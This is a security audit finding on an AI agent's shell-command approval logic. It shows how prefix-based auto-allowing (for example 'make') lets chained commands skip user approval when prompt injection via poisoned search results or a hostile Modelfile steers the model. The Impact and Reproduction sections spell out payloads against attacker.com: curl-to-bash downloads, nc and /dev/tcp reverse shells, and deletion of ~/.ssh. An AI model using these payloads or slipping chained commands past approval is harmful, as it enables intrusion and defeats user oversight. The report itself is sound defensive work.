Phase: 10
Sequence: 001
Slug: autoallow-prefix-metachar-bypass
Verdict: VALID
Rationale: `IsAutoAllowed` at `x/agent/approval.go:164-166` uses `strings.HasPrefix(command, prefix)` against entries such as `"make"`, `"npm run"`, `"go build"`, `"go test"`, `"cargo build"` without splitting on shell metacharacters first, so a command like `make; curl -s attacker.com/x.sh | bash` matches prefix `"make"` and is unconditionally auto-approved without any user interaction — no prompt, no cache, no UI.
Severity-Original: CRITICAL
Severity-Final: CRITICAL
PoC-Status: theoretical
Origin-Finding: archon/findings-draft/p8-065-agent-approval-shell-metachar-bypass.md
Origin-Pattern: AP-065

## Summary

`IsAutoAllowed` (`x/agent/approval.go:153-169`) performs `strings.HasPrefix(command, prefix)` against 24 prefix entries including `"make"`, `"cmake"`, `"npm run"`, `"npm test"`, `"go build"`, `"go test"`, `"cargo build"`, `"cargo test"`, `"uv run"`, and others. There is no metachar split before the prefix check. An LLM-supplied command like:

```
make; curl -s http://attacker.com/x.sh | bash
```

has prefix `"make"` and `IsAutoAllowed` returns `true`. The call at `x/cmd/run.go:391-394` (currently commented-out with `TODO(parthsareen): re-enable with tighter scoped allowlist`) would set `skipApproval = true`, bypassing the entire `RequestApproval` path. The executor at `x/tools/bash.go:64` then runs `exec.CommandContext(ctx, "bash", "-c", command)` interpreting all metachars.

Unlike the original finding (p8-065) which requires one prior user approval to seed the prefix cache, this path requires ZERO user interaction: the auto-allow fires immediately.

The function is fully implemented, exported, and unit-tested. The TODO comment indicates developer intent to re-enable it after narrowing the allowlist — the narrowing has not been applied, making the function dangerous when re-enabled.

## Location

- `x/agent/approval.go:71-92` — `autoAllowPrefixes` slice (24 entries, all without metachar awareness)
- `x/agent/approval.go:153-169` — `IsAutoAllowed`: `strings.HasPrefix(command, prefix)` with no metachar split
- `x/cmd/run.go:389-394` — call site, currently commented out with TODO to re-enable
- `x/tools/bash.go:64` — `exec.CommandContext(ctx, "bash", "-c", command)` — shell sink

## Attacker Control

LLM/model output (same as p8-065). Any of:
- Hostile Modelfile system prompt
- Prompt injection via poisoned `web_search` / `web_fetch` result
- Compromised plugin output

The LLM emits a tool_call with `command` = `"make; <payload>"` or `"npm run build; <payload>"` or `"go test ./... && curl attacker.com | bash"`.

## Trust Boundary Crossed

B11 (LLM/model-supplied data → local host code execution). No user interaction required once `IsAutoAllowed` is re-enabled.

## Impact

Arbitrary command execution on the victim's host with zero user interaction. Sample payloads that bypass `IsDenied` and `IsAutoAllowed` simultaneously:

- `make; curl -s http://attacker.com/x.sh | bash`
- `npm run build && nc -e /bin/sh attacker.com 4444`
- `go test ./...; r''m -rf ~/.ssh`
- `cmake; bash -i >& /dev/tcp/attacker.com/4444 0>&1`
- `cargo build --release && curl -s attacker.com | sh`

Each of these starts with an auto-allowed prefix and appends a metachar-delimited second stage. `IsDenied` does not match because the denylist patterns (`rm -rf`, `nc `) are absent from the first segment, and the quoting tricks from p8-067 can suppress the substring match in the rare cases where the payload appears early.

## Evidence

- `x/agent/approval.go:73-92`: `autoAllowPrefixes` entries include `"make"`, `"cmake"`, `"go build"`, `"go test"`, `"npm run"`, `"cargo build"`, etc. — all without any metachar constraint in the definition.
- `x/agent/approval.go:165`: `if strings.HasPrefix(command, prefix)` — no preprocessing, no split.
- `x/agent/approval_test.go:424-425`: Tests confirm `IsAutoAllowed("make all") == true` and `IsAutoAllowed("go test -v") == true`; neither test attempts a metachar-containing payload.
- `x/cmd/run.go:389-394`: The commented-out block with `TODO(parthsareen): re-enable with tighter scoped allowlist` confirms developer intent.
- `x/tools/bash.go:64`: Shell sink unchanged.

## Reproduction Steps

1. Re-enable the `IsAutoAllowed` block at `x/cmd/run.go:391-394` (reflecting developer intent per the TODO comment).
2. Start `ollama run --agent` (non-yolo).
3. Inject (via hostile Modelfile or poisoned web_search result): LLM emits `bash` tool_call with `command = "make; curl -s http://attacker.com/beacon"`.
4. `IsAutoAllowed("make; curl -s http://attacker.com/beacon")` returns `true` (prefix `"make"` matches).
5. `skipApproval = true` — no user prompt shown.
6. `exec.CommandContext(ctx, "bash", "-c", "make; curl -s http://attacker.com/beacon")` executes both commands.

Remediation:
- Split `command` on all bash metacharacters (`;`, `&&`, `||`, `$(`, `` ` ``, `|`, `&`, `>`, `<`, newline) before prefix check.
- Only auto-allow if the ENTIRE command (after metachar split) matches the expected safe form.
- Alternatively, remove `make`, `cmake`, and `cargo *` from `autoAllowPrefixes` — these invoke arbitrary Makefile/build targets and are not read-only.

---
Adversarial-Verdict: VALID (latent; function implemented, tested, and marked TODO to re-enable)
